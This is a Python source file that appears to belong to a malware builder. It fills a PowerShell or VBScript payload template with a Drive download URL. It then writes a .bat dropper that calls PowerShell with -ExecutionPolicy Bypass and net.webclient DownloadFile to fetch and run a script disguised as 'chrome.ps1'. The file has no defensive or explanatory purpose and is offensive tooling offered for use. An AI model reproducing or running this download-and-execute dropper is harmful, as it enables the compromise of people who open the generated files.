
import os
from colors import Colors
from drive import Drive

class Build :

	def __init__(self, extension, filetype, token) :
		self.extension = extension
		self.filetype = filetype
		self.token = token
		self.zipfile = Drive(self.extension, self.token).get()
		self.color = Colors()

	def builder(self) :
		
		try:

			path = "output/builds/" # Builds files

			if self.filetype == "bat":

				payloads = "data/payloads/powershell/powershell.ps1" # Payload file
			elif self.filetype == "vbs" :
				payloads = "data/payloads/VBScript/vbs.txt" # Payload file

			build = "{}.{}".format(self.extension, self.filetype) # Make .bat file
			powershell = "{}.{}".format("chrome", "ps1") # Make .bat file

			if os.path.exists("output/builds/{}".format(build)):
				print("{} File has been created{}".format(self.color.yellows("[!]"), self.extension))

			with open(payloads, 'r') as f :

				# Set the drop URL or do not
				payload = f.read()

				payload = payload.replace('******', self.zipfile[0])

				print(self.zipfile[0], self.zipfile[1])

				if self.filetype == "bat":

					with open(os.path.join(path, powershell), 'wb') as pwsh :
					# Write the new file
						pwsh.write(payload)
					pwsh.close()

					with open(os.path.join(path, build), 'w') as builder :
						# Write the new file
						batch = "@ECHO OFF PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command (new-object net.webclient).DownloadFile('******','chrome.ps1'); ./chrome.ps1 PAUSE"
						batch = batch.replace('******', self.zipfile[1])
						builder.write(batch)
					builder.close()

				print("{} Execuable file in directory output/extension/{}".format(self.color.status("[+]"), self.extension))

			f.close()

		except IOError as e:
			raise e

